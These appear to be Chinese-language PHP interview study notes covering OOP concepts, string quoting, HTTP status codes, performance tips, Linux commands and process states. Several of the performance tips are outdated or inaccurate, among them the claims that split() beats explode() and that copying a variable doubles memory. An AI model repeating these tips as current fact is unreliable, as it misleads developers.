需要注意的是，在接口中定义一个构造方法是被允许的。在有些场景下这可能会很有用，例如用于工厂模式时。

实现（implements）

要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法， 否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。

在 PHP 5.3.9 之前，实现多个接口时，接口中的方法不能有重名，因为这可能会有歧义。

在最近的 PHP 版本中，只要这些重名的方法签名相同，这种行为就是允许的。

接口也可以继承，通过使用 extends 操作符。

类要实现接口，必须使用和接口中所定义的方法完全一致的方式。否则会导致致命错误。

接口中也可以定义常量。接口常量和类常量的使用完全相同，但是不能被子类或子接口所覆盖。

抽象类和接口在语法上的异同：

相同点

都不能被实例化

不同点     

第一点． 接口是抽象类的变体，接口中所有的方法都是抽象的。而抽象类是声明方法的存在而不去实现它的类。

第二点． 接口可以多继承，抽象类不行

第三点． 接口定义方法，不能实现，而抽象类可以实现部分方法。

第四点． 接口中基本数据类型为static 而抽类象不是的。

应用场景

抽象类表示的是，这个对象是什么。接口表示的是，这个对象能做什么。

比如，男人，女人，这两个类（如果是类的话……），他们的抽象类是人。

说明，他们都是人。人可以吃东西，狗也可以吃东西，你可以把“吃东西”定义成一个接口，然后让这些类去实现它.

所以，在高级语言上，一个类只能继承一个类（抽象类）

(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。

当你关注一个事物的本质的时候，用抽象类；当你关注一个操作的时候，用接口。

另一个重要的概念就是多态，多态通过分离做什么和怎么做，从另一个角度将接口和实现分离出来。

多态不但能够改善代码的组织结果和可读性，还能创建可扩展的程序

即无论在项目最初创建时还是在需要添加新功能时都可以“生长”的程序。

由于接口更关注于动作的实现，多态主要是分离“做什么”和“怎么做”

所以接口的另一个重要的应用就是多态的实现（当然抽象类也可以实现多态，但是接口更加合适）。

抽象类的功能要远超过接口，但是，定义抽象类的代价高。

因为高级语言来说（从实际设计上来说也是）每个类只能继承一个类。

在这个类中，你必须继承或编写出其所有子类的所有共性。

虽然接口在功能上会弱化许多，但是它只是针对一个动作的描述。

而且你可以在一个类中同时实现多个接口。在设计阶段会降低难度的。

### Trait 是什么东西
http://php.net/manual/zh/language.oop5.traits.php

Trait

自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。

Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。

Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。 

Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。

上述说明可以提取出几个关键词：代码复用、单继承、减少复杂性。

单继承与多继承

单继承：一个类只能继承一个父类的方式

多继承：一个类可以继承多个父类的方式

说到单继承，不得不提到另外一个特性：多态。

多态和继承是软件开发中常用的代码复用方式，但是继承的方式虽然也能解决问题， 但其思路违背了面向对象的原则，显得很粗暴；

多态方式也可行，但不符合软件开发中的 DRY （ Don't repeat yourself ） 原则，增加了维护成本。

此时此刻，Trait 以一种全新的继承方式出现了， 它既解决了前文叙述的两种继承方式的弊端，也相对优雅的实现了代码的复用。

简单说一下 Trait 在底层的运行原理：PHP 解释器在编译代码时会把 Trait 部分代码复制粘贴到类的定义体中， 但是不会处理这个操作引入的不兼容问题。

Trait 和 Class 相似，但仅仅旨在用细粒度和一致的方式来组合功能。 

无法通过 trait 自身来实例化。它为传统继承增加了水平特性的组合；

也就是说，应用的几个 Class 之间不需要继承。

使用了 Trait 之后，我们只需要再提取出『安卓系统』和『高分辨率』这两个特性 就可以很方便的在这三个类里随意组合，而且还能保证你的代码非常清晰。
```
<?php
// 共同拥有的面部识别功能
trait Faceable {
    protected $face_id = 0;
    // 就当我是获取面部信息的功能
    public function getFace()
    {
        return $this->face_id;
    }
    // 就当我是设置面部信息的功能
    public function setFace(string $face_id)
    {
        $this->face_id = $face_id;
    }
}
// 安卓系统
trait Androidable{
}
// 高分辨率
trait HDisplayable{
}
// 小米Note3
class MiNote3 {
    use Faceable,Androidable;
    // ...
}
// GalaxyS8
class SamsangS8 {
    use Faceable,Androidable,HDisplayable;
    // ...
}
// iPhoneX
class iPhoneX {
    use Faceable,HDisplayable;
    // ...
}
```
这样看起来是不是清晰很多呢？他不仅降低了代码的耦合性，还提升了代码的可读性。
依我看来，他不光是某种特性的集合，更像是将某个功能细化了的代码块。

### echo、print、print_r 区别(区分出表达式与语句的区别)

https://stackoverflow.com/questions/1647322/whats-the-difference-between-echo-print-and-print-r-in-php

print和echo或多或少是相同的; 它们都是显示字符串的语言构造。 差异是细微的：

print具有返回值，因此它可以在表达式中使用，

echo具有void返回类型; 

echo可以使用多个参数；

echo比print快一点。

var_dump打印出变量的详细转储，包括变量的类型和任何子项的类型（如果是数组或对象）。

print_r以更易于理解的形式打印变量：不带引号的字符串，忽略类型信息，不提供数组大小等。

var_dump print_r 根据我的经验，通常var_dump调试时有用。

当您不完全知道变量中具有哪些值/类型时，它特别有用。
```
$values = array(0, 0.0, false, '');
var_dump($values);
print_r ($values);

array(4) {
  [0]=>
  int(0)
  [1]=>
  float(0)
  [2]=>
  bool(false)
  [3]=>
  string(0) ""
}

Array
(
    [0] => 0
    [1] => 0
    [2] => 
    [3] => 
)
```

### __construct 与 __destruct 区别
http://php.net/manual/zh/language.oop5.decon.php

构造函数 __construct ([ mixed $args [, $... ]] ) : void

PHP 5 允行开发者在一个类中定义一个方法作为构造函数。

具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。

如果子类中定义了构造函数则不会隐式调用其父类的构造函数。

要执行父类的构造函数，需要在子类的构造函数中调用 parent::__construct()。

如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承（假如没有被定义为 private 的话）。
```
<?php
class BaseClass {
   function __construct() {
       print "In BaseClass constructor\n";
   }
}

class SubClass extends BaseClass {
   function __construct() {
       parent::__construct();
       print "In SubClass constructor\n";
   }
}

class OtherSubClass extends BaseClass {
    // inherits BaseClass's constructor
}

// In BaseClass constructor
$obj = new BaseClass();

// In BaseClass constructor
// In SubClass constructor
$obj = new SubClass();

// In BaseClass constructor
$obj = new OtherSubClass();
```
为了实现向后兼容性，如果 PHP 5 在类中找不到 __construct() 函数并且也没有从父类继承一个的话，

它就会尝试寻找旧式的构造函数

也就是和类同名的函数。因此唯一会产生兼容性问题的情况是：

类中已有一个名为 __construct() 的方法却被用于其它用途时。

与其它方法不同，当 __construct() 被与父类 __construct() 具有不同参数的方法覆盖时， PHP 不会产生一个 E_STRICT 错误信息。

自 PHP 5.3.3 起，在命名空间中，与类名同名的方法不再作为构造函数。这一改变不影响不在命名空间中的类。
```
<?php
namespace Foo;
class Bar {
    public function Bar() {
        // treated as constructor in PHP 5.3.0-5.3.2
        // treated as regular method as of PHP 5.3.3
    }
}
```
析构函数 __destruct ( void ) : void

PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言， 如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
```
<?php
class MyDestructableClass {
   function __construct() {
       print "In constructor\n";
       $this->name = "MyDestructableClass";
   }

   function __destruct() {
       print "Destroying " . $this->name . "\n";
   }
}

$obj = new MyDestructableClass();
```
和构造函数一样，父类的析构函数不会被引擎暗中调用。

要执行父类的析构函数，必须在子类的析构函数体中显式调用 parent::__destruct()。

此外也和构造函数一样，子类如果自己没有定义析构函数则会继承父类的。

析构函数即使在使用 exit() 终止脚本运行时也会被调用。

在析构函数中调用 exit() 将会中止其余关闭操作的运行。

### 单引号`'`与双引号`"`区别

https://stackoverflow.com/questions/3446216/what-is-the-difference-between-single-quoted-and-double-quoted-strings-in-php#answer-3446286

1. 单引号内部的变量不会执行， 双引号会执行
2. 单引号解析速度比双引号快。
3. 单引号只能解析部分特殊字符，双引号可以解析所有特殊字符。

在PHP中，我们可以使用单引号或者双引号来表示字符串。

不过我们作为开发者，应该了解其中的区别。

单引号与双引号对于定义字符一个是可以解析变量一个是会把变量直接输出来，

同时单引号与双引号在字符处理上单引号要优于双引号

转义的字符不同

单引号和双引号中都可以使用转义字符(＼)，但只能转义在单引号中引起来的单引号和转义转义符本身。

如果用双引号(“”)括起字符串，PHP懂得更多特殊字符串的转义序列。

对变量的解析不同

单引号字符串中出现的变量不会被变量值替代。即PHP不会解析单引号中的变量，而是将变量名原样输出。

双引号字符串最重要的一点是其中的变量名会被变量值替代，即可以解析双引号中包含的变量。

解析速度不同

单引号不需要考虑变量的解析,速度比双引号快.推荐用单引号.

有的时候双引号也比较好用,比如在拼凑sql 语句

PHP引号使用原则

字符串的值用引号

PHP中尽量用单引号,HTML代码全部用双引号

在包含变量的时候,用双引号可以简化操作

复杂的情况下用大括号包起来

有的时候需要用php生成文本文件，换行符n需要用双引号才能好使，单引号则会直接把n当成字符输出。

在字符串里面不需要加入 变量 或者 单引号(')和反斜杠(＼) 时，尽量用单引号引字符串，

因为省去了双引号检查处理转义和解析变量上面的时间。能用单引号尽量用单引号。

### 常见 HTTP 状态码，分别代表什么含义

https://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81

HTTP 状态码用来告诉客户端，发生了什么事情，状态码位于响应的起始行中

```
状态码分类
|状态码|整体范围|已定义范围|分类|
|-|-|-|-|
|1XX|100~199|100~101|信息提示|
|2XX|200~299|200~206|成功|
|3XX|300~399|300~305|重定向|
|4XX|400~499|400~415|客户端错误|
|5XX|500~599|500~505|服务器错误|

常见状态码
|状态码|原因短语|含义|考察概率|
|-|-|-|-|
|200|OK|请求没有问题|###**|
|206|Partial Content|部分或 Range(范围) 请求|###|
|301|Moved Permanently|在请求的链接被移除时使用|###*|
|302|Found|在请求临时的链接使用|###*|
|304|Not Modified|资源未被修改可使用旧资源|###*|
|307|Temporary Redirect|在请求临时的链接使用|###*|
|400|Bad Request|告知客户端发送了错误请求|###**|
|403|Forbidden|请求被服务器拒绝|###**|
|404|Not Found|无法找到所请求的 URL|###**|
|413|Request entiry too large|请求实体过大|###|
|500|Internal Server Error|服务器遇到错误|###**|
|502|Bad Gateway|代理或网关错误(无法连接到其父网关)|###**|
|503|Service Unavailable|无法为请求提供服务|###**|
|504|Gateway Timeout|代理或网关超时(等待另一服务器响应超时)|###**|
```

### 如何返回一个301重定向 
https://stackoverflow.com/questions/7324645/php-header-redirect-301-what-are-the-implications

```
`**[WARNING]**` 一定当心设置 301 后脚本会继续执行，不要认为下面不会执行，必要时使用 `die` or `exit` 301的作用是搜索引擎将为/ option-a而不是/ option-x编制索引。

这可能是一件好事，因为/ option-x对于搜索索引而言是不可访问的，因此可能会对索引产生积极影响。仅当您明智地使用它时;

重定向后放入exit（）; 停止执行脚本的其余部分
header("HTTP/1.1 301 Moved Permanently"); 
header("Location: /option-a"); 
exit();
```

### 301 什么意思 404 呢?
https://zh.wikipedia.org/wiki/HTTP_404

https://zh.wikipedia.org/wiki/HTTP_301

301 Move Permanently 是HTTP协议中的一个状态码（Status Code）。

可以简单地理解为该资源已经被永久改变了位置，通常会发送HTTP Location来重定向到正确的新位置。

HTTP 404或Not Found错误消息是HTTP的其中一种“标准回应消息”（HTTP状态码）， 此消息代表客户端在浏览网页时，服务器无法正常提供消息，或是服务器无法回应且不知原因。

通常是因为用户所访问的对应网页已被删除、移动或从未存在。

404也是互联网上最常见的错误之一。

404错误消息可能与“server not found”（无法找到服务器）或其他类似消息产生混淆。

## 进阶篇

### 48条高效率的PHP优化写法
https://www.awaimai.com/1050.html

1 字符串

1.1 少用正则表达式

能用PHP内部字符串操作函数的情况下，尽量用他们，不要用正则表达式， 因为其效率高于正则。

没得说，正则最耗性能。

str_replace函数要比preg_replace快得多，strtr函数又比str_replace来得快。

有没有你漏掉的好用的函数？

例如：strpbrk()、strncasecmp()、strpos()、strrpos()、stripos()、strripos()。

1.2 字符替换

如果需要转换的全是单个字符，用字符串作为 strtr() 函数完成替换，而不是数组：
```
$addr = strtr($addr, "abcd", "efgh");       // 建议
$addr = strtr($addr, array('a' => 'e', ));  // 不建议
```

效率提升：10 倍。

str_replace字符替换比正则替换preg_replace快，但strtr比str_replace又快1/4。

另外，不要做无谓的替换，即使没有替换，str_replace也会为其参数分配内存。很慢！

用 strpos 先查找（非常快），看是否需要替换，如果需要，再替换。

如果需要替换，效率几乎相等，差别在 0.1% 左右。

如果不需要替换：用 strpos 快 200%。

1.3 压缩大的字符串

使用 gzcompress() 和 gzuncompress() 对容量大的字符串进行压缩和解压，再存入和取出数据库。

这种内置的函数使用gzip算法，能压缩字符串90%。

1.4 echo 输出

echo 字符串用逗号代替点连接符更快些。

虽然，echo是一种语言结构，不是真正的函数。

但是，它可以把逗号隔开的多个字符串当作“函数”参数传入，所以速度会更快。

```
echo $str1, $str2;       // 速度快
echo $str1 . $str2;      // 速度稍慢
```

1.5 尽量用单引号

PHP 引擎允许使用单引号和双引号来封装字符串变量，但是它们的速度是有很大的差别的！

使用双引号的字符串会告诉 PHP 引擎，首先去读取字符串内容，查找其中的变量，并改为变量对应的值。

一般来说字符串是没有变量的，使用双引号会导致性能不佳。

最好使用字符串连接，而不是双引号字符串。

```
$output = "This is a plain string";  // 不好的实践
$output = 'This is a plain string';  // 好的实践

$type = "mixed";                     // 不好的实践
$output = "This is a $type string";

$type = 'mixed';                     // 好的实践
$output = 'This is a ' . $type . ' string';
```

1.6 使用isset代替strlen

在检验字符串长度时，我们第一想法会使用 strlen() 函数。

isset函数执行起来相当快，因为它不做任何计算，

只返回在zval结构（C的内置数据结构，用于存储PHP变量）中存储的已知字符串长度。

但是，由于strlen()是函数，多多少少会有些慢，因为函数调用会经过诸多步骤，

如字母小写化、哈希查找，会跟随被调用的函数一起执行。

在某些情况下，你可以使用 isset() 技巧加速执行你的代码。例如：

```
if (strlen($foo) < 5) {
    echo "Foo is too short";
}

// 使用isset()
if (!isset($foo{5})) {
    echo "Foo is too short";
}
```

1.7 用split分割字符串

在分割字符串时，split()要比explode()快。

```
split()
0.001813 - 0.002271 seconds (avg 0.002042 seconds)
explode()
0.001678 - 0.003626 seconds (avg 0.002652 seconds)
```

1.8 echo效率高于print

因为echo没有返回值，print返回一个整型。

注意：echo输出大字符串的时候，如果没有调整就会严重影响性能。

打开Apache的mod_deflate进行压缩，或者打开ob_start将内容放进缓冲区，可以改善性能问题。

2 语句

2.1 最好不用@

用@掩盖错误会降低脚本运行速度，并且在后台有很多额外操作。

用@比起不用，效率差距 3 倍。特别不要在循环中使用@。

在 5 次循环的测试中，即使是先用error_reporting(0)关掉错误，循环完成后再打开，都比用@快。

2.2 避免使用魔术方法

对于__开头的函数就命名为魔术函数，它们都在特定的条件下触发。

这些魔术函数包括：__construct()、__get()、__call()、__autoload()等等。

以__autoload() 为例，如果不能将类名与实际的磁盘文件对应起来，将不得不做大量的文件存在判断。

而判断文件存在需要磁盘I/O操作，众所周知，磁盘I/O操作的效率很低，

因此这才是使得autoload机制效率降低的原因。

因此，在系统设计时，需要定义一套清晰的、将类名与实际磁盘文件映射的机制。

这个规则越简单越明确，__autoload()机制的效率就越高。

autoload机制并不是天然的效率低下，只有滥用autoload、设计不好的自动装载函数，才会导致其效率的降低.

所以说，尽量避免使用__autoload等魔术方法，有待商榷。

2.3 别在循环里用函数

```
例如：
for($x=0; $x < count($array); $x++) {
}
```

这种写法在每次循环的时候都会调用 count() 函数，效率大大降低，建议这样：

```
$len = count($array);
for($x=0; $x < $len; $x++) {
}
```

让函数在循环外面一次获得循环次数。

2.4 使用三元运算符

在简单的判断语句中，三元运算符?:更简洁高效。

2.5 使用选择分支语句

switch、case好于使用多个if、else if语句，并且代码更加容易阅读和维护。

2.6 屏蔽敏感信息

使用 error_reporting() 函数来预防潜在的敏感信息显示给用户。

理想的错误报告应该被完全禁用在php.ini文件里。

如果用的是共享虚拟主机，php.ini不能修改，最好添加 error_reporting() 函数。

放在每个脚本文件的第一行，或者用require_once()来加载，

能有效的保护敏感的SQL查询和路径，在出错时不被显示。

2.7 不实用段标签<?

不要使用开始标志的缩写形式，你正在使用这样的符号吗<?，应该用完整的<?php开始标签。

当然，如果是输出变量，用<?= $value ?>这种方式是鼓励的，可以是代码更加简洁。

2.8 纯PHP代码不加结束标记

如果文件内容是纯 PHP 代码，最好在文件末尾删除 PHP 结束标记?>。

这可以避免在 PHP 结束标记之后万一意外加入了空格或者换行符，

会导致 PHP 开始输出这些空白，而脚本中此时并无输出的意图。

2.9 永远不要使用register_globals和magic quotes

这是两个很古老的功能，在当时（十年前）也许是一个好方法，但现在看来并非如此。

老版本的PHP在安装时会默认打开这两个功能，这会引起安全漏洞、编程错误及其他的问题。

如只有用户输入了数据时才会创建变量等。

PHP5.4.0开始这两个功能都被舍弃了，所以每个程序员都应该避免使用。

如果你过去的程序有使用这两项功能，那就尽快将其剔除吧。

3 函数

3.1 尽量使用PHP内部函数

内置函数使用C语言实现，并且经过PHP官方优化，效率更高。

3.2 使用绝对路径

在include和require中尽量使用绝对路径。

如果包含相对路径，PHP会在include_path里面遍历查找文件。

用绝对路径就会避免此类问题，解析路径所需的时间会更少。

3.3 包含文件

尽量不要用require_once和include_once包含文件，它们多一个判断文件是否被引用的过程，能不用尽量不用。

而使用require、include方法代替。

鸟哥在其博客中就多次声明，尽量不要用require_once和include_once。

3.4 函数快于类方法

调用只有一个参数、并且函数体为空的函数，花费的时间等于7-8次$localvar++运算。

而同一功能的类方法大约为15次$localvar++运算。

3.5 用子类方法

基类里面只放能重用的方法，其他功能尽量放在子类中实现，子类里方法的性能优于在基类中。

3.6 类的性能和其方法数量没有关系

新添加10个或多个方法到测试的类后，性能没什么差异。

3.7 读取文件内容

在可以用file_get_contents()替代file()、fopen()、feof()、fgets()

等系列方法的情况下，尽量用file_get_contents()。

因为他的效率高得多！

3.8  引用传递参数

通过参数地址引用的方式，实现函数多个返回值，这比按值传递效率高。

方法是在参数变量前加个 &。

3.9 方法不要细分得过多

仔细想想你真正打算重用的是哪些代码？

3.10 尽量静态化

如果一个方法能被静态，那就声明它为静态的，速度可提高1/4，甚至我测试的时候，这个提高了近三倍。

当然了，这个测试方法需要在十万级以上次执行，效果才明显。

其实，静态方法和非静态方法的效率主要区别在内存。

静态方法在程序开始时生成内存，实例方法（非静态方法）在程序运行中生成内存。

所以，静态方法可以直接调用，实例方法要先成生实例再调用，静态速度很快，但是多了会占内存。

任何语言都是对内存和磁盘的操作，至于是否面向对象，只是软件层的问题，底层都是一样的，只是实现方法不同。

静态内存是连续的，因为是在程序开始时就生成了，而实例方法申请的是离散的空间，所以当然没有静态方法快。

静态方法始终调用同一块内存，其缺点就是不能自动进行销毁，而实例化可以销毁。

3.11 用C扩展方式实现

如果在代码中存在大量耗时的函数，可以考虑用C扩展的方式实现它们。

4 变量

4.1 及时销毁变量

数组、对象和GLOBAL变量在 PHP 中特别占内存的，这个由于 PHP 的底层的zend引擎引起的。

一般来说，PHP数组的内存利用率只有 1/10。

也就是说，一个在C语言里面100M 内存的数组，在PHP里面就要1G。

特别是，在PHP作为后台服务器的系统中，经常会出现内存耗费太大的问题。

4.2 使用$_SERVER变量

如果你需要得到脚本执行的时间，$_SERVER['REQUSET_TIME']优于time()。

一个是现成就可以直接用，一个还需要函数得出的结果。

4.3 方法里建立局部变量

在类的方法里建立局部变量速度最快，几乎和在方法里调用局部变量一样快。

4.4 局部变量比全局变量快

由于局部变量是存在栈中的。

当一个函数占用的栈空间不是很大的时候，这部分内存很有可能全部命中cache，CPU访问的效率是很高的。

相反，如果一个函数同时使用全局变量和局部变量，

当这两段地址相差较大时，cpu cache需要来回切换，效率会下降。

4.5 局部变量而不是对象属性

建立一个对象属性（类里面的变量，例如：$this->prop++）比局部变量要慢3倍。

4.6 提前声明局部变量

建立一个未声明的局部变量，要比建立一个已经定义过的局部变量慢9-10倍。

4.7 谨慎声明全局变量

声明一个未被任何一个函数使用过的全局变量，也会使性能降低。

这和声明相同数量的局部变量一样，PHP可能去检查这个全局变量是否存在。

4.8 使用++$i递增

```
当执行变量$i的递增或递减时，$i++会比++$i慢一些。

这种差异是PHP特有的，并不适用于其他语言，所以请不要修改你的C或Java代码，并指望它们能立即变快，没用的。

++$i更快是因为它只需要3条指令(opcodes)，$i++则需要4条指令。

后置递增实际上会产生一个临时变量，这个临时变量随后被递增。

而前置递增直接在原值上递增。

这是最优化处理的一种，正如Zend的PHP优化器所作的那样。

牢记，这个优化处理不失为一个好主意，因为不是所有的指令优化器都会做同样的优化处理。
```

4.9 不要随便复制变量

有时候为了使 PHP 代码更加整洁，一些 PHP 新手（包括我）会把预定义好的变量，复制到一个名字更简短的变量中。

其实这样做的结果是增加了一倍的内存消耗，只会使程序更加慢。

试想一下，在下面的例子中，如果用户恶意插入 512KB 字节的文字，就会导致 1MB 的内存被消耗！

```
// 不好的实践
$description = $_POST['description'];
echo $description;

// 好的实践
 echo $_POST['description'];
```

4.10 循环内部不要声明变量

尤其是大变量，这好像不只是PHP里面要注意的问题吧？

4.11 一定要对变量进行初始化

这里的“初始化”指的是“声明”。

当需要没有初始化的变量，PHP解释器会自动创建一个变量，但依靠这个特性来编程并不是一个好主意。

这会造成程序的粗糙，或者使代码变得另人迷惑。

因为你需要探寻这个变量是从哪里开始被创建的。

另外，对一个没有初始化的变量进行递增操作要比初始化过的来得慢。

所以对变量进行初始化会是个不错的主意。

5 数组

5.1 用字符串而不是数组作为参数

如果一个函数既能接受数组，又能接受简单字符做为参数，那么尽量用字符作为参数。

例如，字符替换函数，参数列表并不是太长，就可以考虑额外写一段替换代码。

使得每次传递参数都是一个字符，而不是接受数组做为查找和替换参数。

5.2 数组元素加引号
```
$row['id']比$row[id]速度快7倍。

如果不带引号，例如$a[name]，那么PHP会首先检查有没有define定义的name常量。

如果有，就用这个常量值作为数组键值。如果没有，再查找键值为字符串'name'的数组元素。

多了一个查找判断的过程，所以建议养成数组键名加引号的习惯。

正如上面字符串部分所述，用'又比用"速度更快。
```

5.3 多维数组操作

多维数组尽量不要循环嵌套赋值。

5.4 循环用foreach

尽量用foreach代替while和for循环，效率更高。

6 架构

6.1 压缩输出

在php.ini中开启gzip压缩：

zlib.output_compression = On
zlib.output_compression_level = (level)

level可能是1-9之间的数字，你可以设置不同的数字。

几乎所有的浏览器都支持Gzip的压缩方式，gzip可以降低80%的输出.

付出的代价是，大概增加了10%的cpu计算量。

但是还是会赚到了，因为带宽减少了，页面加载会变得很快。

如果你使用apache，也可以激活mod_gzip模块。

6.2 静态化页面

Apache/Nginx解析一个PHP脚本的时间，要比解析一个静态HTML页面慢2至10倍。

所以尽量使页面静态化，或使用静态HTML页面。

6.3 将PHP升级到最新版

提高性能的最简单的方式是不断升级、更新PHP版本。

6.4 利用PHP的扩展

一直以来，大家都在抱怨PHP内容太过繁杂。

最近几年来，开发人员作出了相应的努力，移除了项目中的一些冗余特征。

即便如此，可用库以及其它扩展的数量还是很可观。

甚至一些开发人员开始考虑实施自己的扩展方案。

6.5 PHP缓存

一般情况下，PHP脚本被PHP引擎编译后执行，会被转换成机器语言，也称为操作码。

如果PHP脚本反复编译得到相同的结果，为什么不完全跳过编译过程呢？

PHP加速器缓存了编译后的机器码，允许代码根据要求立即执行，而不经过繁琐的编译过程。

对PHP开发人员而言，目前提供了两种可用的缓存方案。

一种是APC（Alternative PHP Cache，可选PHP缓存），它是一个可以通过PEAR安装的开源加速器。

另一种流行的方案是OPCode，也就是操作码缓存技术。

6.6 使用NoSQL缓存

Memchached或者Redis都可以。

这些是高性能的分布式内存对象缓存系统，能提高动态网络应用程序性能，减轻数据库的负担。

这对运算码 （OPcode）的缓存也很有用，使得脚本不必为每个请求重新编译。

### linux常用命令及工具
`ps aux` 查看进程pid等常用

`grep` 过滤，-E支持表达式

`curl` 发起一次请求

`kill -9 pid` 杀死进程

`top` linux版任务管理器，查看当前进程占用内存CPU

`wc -l` 计算行数

`tail -f file` 实时查看文件变化

`contab` 定时任务工具

### 进程的状态和转换详解

https://blog.csdn.net/qwe6112071/article/details/70473905

进程的状态和转换

三态模型

一个进程从创建而产生至撤销而消亡的整个生命周期，可以用一组状态加以刻划，

根据三态模型，进程的生命周期可分为如下三种进程状态：

1. 运行态(running):占有处理器正在运行
2. 就绪态(ready):具备运行条件，等待系统分配处理器以便运行
3. 等待态(blocked):不具备运行条件，正在等待某个事件的完成

运行状态的进程将由于出现等待事件而进入等待状态，

当等待事件结束之后等待状态的进程将进入就绪状态，

而处理器的调度策略又会引起运行状态和就绪状态之间的切换。

引起进程状态转换的具体原因如下：

运行态—→等待态：等待使用资源；如等待外设传输；等待人工干预。

等待态—→就绪态：资源得到满足；如外设传输结束；人工干预完成。

运行态—→就绪态：运行时间片到；出现有更高优先权进程。

就绪态—→运行态：CPU 空闲时选择一个就绪进程。

五态模型

在一个实际的系统里进程的状态及其转换比上节叙述的会复杂一些，例如引入专门的新

建态（new）和终止态（exit ）

状态转换图如下所示：

建态对应于进程刚刚被创建的状态。创建一个进程要通过两个步骤，

1. 为一个新进程创建必要的管理信息，
2. 让该进程进入就绪态。此时进程将处于新建态，它并没有被提交执行， 而是在等待操作系统完成创建进程的必要操作。

 需要注意的是，操作系统有时将根据系统性能或主存容量的限制推迟新建态进程的提交

类似地，进程的终止也要通过两个步骤，首先,是等待操作系统进行善后，然后,退出主存。当一个进 程到达了自然结束点，或是出现了无法克服的错误，或是被操作系统所终结，或是被其他有终止权的进 程所终结，它将进入终止态。进入终止态的进程以后不再执行，但依然临时保留在操作系统中等待善后 。

一旦其他进程完成了对终止态进程的信息抽取之后，操作系统将删除该进程。

引起进程状态转换的具体原因如下：

NULL—→新建态：执行一个程序，创建一个子进程。

新建态—→就绪态：当操作系统完成了进程创建的必要操作，并且当前系统的性能和虚拟内存的容量均允许。

运行态—→终止态：当一个进程到达了自然结束点，或是出现了无法克服的错误，

或是被操作系统所终结，或是被其他有终止权的进程所终结。

终止态—→NULL：完成善后操作。

就绪态—→终止态：未在状态转换图中显示，但某些操作系统允许父进程终结子进程。

等待态—→终止态：未在状态转换图中显示，但某些操作系统允许父进程终结子进程。

七态模型

进程的挂起

到目前为止，我们或多或少总是假设所有的进程都在内存中。

事实上，可能出现这样一些情况，例如由于进程的不断创建，

系统的资源已经不能满足进程运行的要求，这个时候就必须把某些进程挂起（suspend），

对换到磁盘镜像区中，暂时不参与进程调度，起到平滑系统操作负荷的目的。

引起进程挂起的原因是多样的，主要有：

1. 系统中的进程均处于等待状态，处理器空闲， 此时需要把一些阻塞进程对换出去，以腾出足够的内存装入就绪进程运行。
2. 进程竞争资源，导致系统资源不足，负荷过重， 此时需要挂起部分进程以调整系统负荷 ,保证系统的实时性或让系统正常运行。
3. 把一些定期执行的进程（如审计程序、监控程序、记账程序）对换出去，以减轻系统负荷。
4. 用户要求挂起自己的进程，以便根据中间执行情况和中间结果进行某些调试、检查和改正。
5. 父进程要求挂起自己的后代进程，以进行某些检查和改正。
6. 操作系统需要挂起某些进程，检查运行中资源使用情况， 以改善系统性能;或当系统出现故障或某些功能受到破坏时，需要挂起某些进程以排除故障。

七态模型描述

下面是具有七态模型的进程状态及其转换：

在此类系统中，进程增加了两个新状态：

挂起就绪态（ready,suspend）

挂起就绪态表明了进程具备运行条件但目前在二级存储器中，只有当它被对换到主存才能被调度执行

挂起等待态（blocked,suspend）挂起等待态则表明了进程正在等待某一个事件且在二级存储器中。

引起进程状态转换的具体原因如下：

等待态—→挂起等待态：如果当前不存在就绪进程，

那么至少有一个等待态进程将被对换出去成为挂起等待态；

操作系统根据当前资源状况和性能要求，可以决定把等待态进程对换出去成为挂起等待态。

挂起等待态—→挂起就绪态：引起进程等待的事件发生之后，相应的挂起等待态进程将转换为挂起就绪态。

挂起就绪态—→就绪态：当内存中没有就绪态进程，或者挂起就绪态进程具有比就绪态进程更高的优先级，

系统将把挂起就绪态进程转换成就绪态。

就绪态—→挂起就绪态：操作系统根据当前资源状况和性能要求，也可以决定把就绪态进程对换出去成为挂起就绪态。

挂起等待态—→等待态：当一个进程等待一个事件时，原则上不需要把它调入内存。但是在下面一种情况下，

这一状态变化是可能的。当一个进程退出后，主存已经有了一大块自由空间,

而某个挂起等待态进程具有较高的优先级并且操作系统已经得知导致它阻塞的事件即将结束，

此时便发生了这一状态变化。

运行态—→挂起就绪态：当一个具有较高优先级的挂起等待态进程的等待事件结束后，

它需要抢占 CPU，，而此时主存空间不够，从而可能导致正在运行的进程转化为挂起就绪态。

另外处于运行态的进程也可以自己挂起自己。

新建态—→挂起就绪态：考虑到系统当前资源状况和性能要求，

可以决定新建的进程将被对换出去成为挂起就绪态。

可以把一个挂起进程等同于不在主存的进程，因此挂起的进程将不参与进程调度直到它

们被对换进主存。一个挂起进程具有如下特征：

1. 该进程不能立即被执行。
2. 挂起进程可能会等待一个事件，但所等待的事件是独立于挂起条件的，事件结束并不能导致进程具备执行条件。
3. 进程进入挂起状态是由于操作系统、父进程或进程本身阻止它的运行。
4. 结束进程挂起状态的命令只能通过操作系统或父进程发出。

### TCP/IP

https://developer.51cto.com/art/201906/597961.htm

一、 计算机网络体系结构分层

计算机网络体系结构分层

不难看出，TCP/IP 与 OSI 在分层模块上稍有区别。

OSI 参考模型注重“通信协议必要的功能是什么”，

而 TCP/IP 则更强调“在计算机上实现协议应该开发哪种程序”。

二、 TCP/IP 基础

1. TCP/IP 的具体含义

从字面意义上讲，有人可能会认为 TCP/IP 是指 TCP 和 IP 两种协议。

实际生活当中有时也确实就是指这两种协议。

然而在很多情况下，它只是利用 IP 进行通信时所必须用到的协议群的统称。

具体来说，IP 或 ICMP、TCP 或 UDP、TELNET 或 FTP、以及 HTTP 等都属于 TCP/IP 协议。

他们与 TCP 或 IP 的关系紧密，是互联网必不可少的组成部分。

TCP/IP 一词泛指这些协议，因此，有时也称 TCP/IP 为网际协议群。

